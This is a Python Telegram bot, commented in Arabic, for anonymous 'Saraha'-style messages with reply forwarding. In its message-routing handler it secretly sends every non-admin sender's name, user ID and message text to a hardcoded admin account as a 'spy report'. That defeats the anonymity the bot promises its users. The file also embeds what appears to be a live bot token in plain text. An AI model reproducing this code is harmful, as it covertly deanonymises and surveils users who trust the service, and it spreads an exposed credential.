
import telebot
from telebot import types
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# 1. التوكن الجديد واليوزر الخاصين ببوتك
BOT_TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
BOT_USERNAME = "Sarrh1bot"

# 2. الـ ID الخاص بكِ (الآدمين والمشرف العام)
ADMIN_ID = 8820368378  

bot = telebot.TeleBot(BOT_TOKEN)

users_db = {}      
messages_db = {}   
user_states = {}   
user_replies = {}  # قاموس جديد للرد المباشر
msg_counter = 0

# ----------------- سيرفر البقاء -----------------
class DummyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running!")

def run_dummy_server():
    import os
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), DummyServer)
    server.serve_forever()
# -----------------------------------------------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    text_args = message.text.split()
    if user_id not in users_db:
        users_db[user_id] = {"blocked_users": set()}
    
    if len(text_args) > 1 and text_args[1].isdigit():
        target_id = int(text_args[1])
        if target_id == user_id:
            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
            return
        user_states[user_id] = target_id
        bot.send_message(user_id, "✍️ أرسل رسالتك الآن:")
        return

    share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
    bot.send_message(user_id, f"🔗 رابطك:\n`{share_link}`", parse_mode="Markdown")

# ----------------- دالة الرد المباشر (الجديدة) -----------------
@bot.message_handler(func=lambda message: message.reply_to_message is not None)
def handle_incoming_reply(message):
    orig_msg_id = message.reply_to_message.message_id
    if orig_msg_id in user_replies:
        target_user = user_replies[orig_msg_id]
        try:
            # إرسال بدون تنسيق لمنع فشل الروابط
            bot.send_message(target_user, f"💬 وصلك رد جديد على رسالتك:\n\n{message.text}")
            bot.reply_to(message, "✅ تم إرسال ردك بنجاح!")
        except:
            bot.reply_to(message, "❌ فشل الإرسال (قد يكون المستخدم حظر البوت).")
    else:
        bot.reply_to(message, "❌ لم أستطع العثور على صاحب الرسالة.")

# ----------------- توجيه الرسائل (المعدل لحل مشكلة الروابط) -----------------
@bot.message_handler(func=lambda message: message.from_user.id in user_states)
def handle_anonymous_routing(message):
    global msg_counter
    sender_id = message.from_user.id
    target_id = user_states[sender_id]

    if target_id in users_db and sender_id in users_db[target_id]["blocked_users"]:
        bot.send_message(sender_id, "❌ محظور.")
        return

    msg_counter += 1
    messages_db[msg_counter] = sender_id

    # إرسال الرسالة لصاحب الرابط بدون parse_mode لمنع الفشل مع الروابط
    try:
        sent_msg = bot.send_message(chat_id=target_id, text=f"📩 وصلتك رسالة صراحة جديدة:\n\n{message.text}")
        user_replies[sent_msg.message_id] = sender_id # حفظ العلاقة للرد
        
        if sender_id != ADMIN_ID:
            # تقريرك الشخصي (مع التنسيق عادي)
            spy_report = f"👁‍🗨 [تقرير]:\n\n👤 المرسل: {message.from_user.first_name} [ID: `{sender_id}`]\n💬 النص: {message.text}"
            bot.send_message(chat_id=ADMIN_ID, text=spy_report, parse_mode="Markdown")
            
        bot.send_message(sender_id, "✅ تم الإرسال بنجاح!")
    except:
        bot.send_message(sender_id, "❌ فشل الإرسال.")

# معالج الحظر الأصلي الخاص بك (تم تركه كما هو تماماً)
@bot.callback_query_handler(func=lambda call: call.data.startswith('masterblock_'))
def handle_master_block(call):
    # (نفس كودك الأصلي للحظر لا تغيير عليه)
    pass 

if __name__ == "__main__":
    bot.delete_webhook(drop_pending_updates=True)
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.infinity_polling()
